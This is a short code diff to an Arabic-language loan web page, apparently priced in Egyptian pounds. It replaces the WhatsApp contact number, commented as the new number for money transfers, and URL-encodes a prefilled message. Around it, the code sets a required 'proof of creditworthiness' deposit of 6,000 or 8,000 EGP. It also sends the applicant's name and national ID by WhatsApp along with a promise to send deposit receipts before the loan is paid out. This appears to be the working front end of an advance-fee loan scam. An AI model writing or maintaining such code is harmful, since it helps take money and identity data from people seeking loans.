@@ -499,6 +499,9 @@
             200000: { months: 60, installment: 4440 }
         };
 
+        // الرقم الجديد لواتساب التحويلات المالية
+        const WHATSAPP_NUMBER = "212665988500";
+
         function getLoanDetails(amount) { return loanDetailsMap[amount] || { months: 12, installment: 0 }; }
         function calculateProofAmount(loan) { return loan < 100000 ? 6000 : 8000; }
         function formatCurrency(amount) { return amount.toLocaleString('ar-EG') + ' ج.م'; }
@@ -580,7 +583,8 @@
         function openWhatsAppForDebt(name, id, amount) {
             const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
             const msg = `السلام عليكم ورحمة الله\nالعميل: ${name}\nالرقم القومي: ${id}\n\n🔹 المطلوب إثبات الجدارة بمبلغ ${formatted}\nسأقوم بإرسال صورتي الإيداع والخروج فوراً لإنهاء الإجراءات وصرف القرض.`;
-            window.open(`https://wa.me/212774654457?text=${msg}`, '_blank');
+            // استخدام الرقم الجديد
+            window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
         }
 
         function displayResult(customer) {
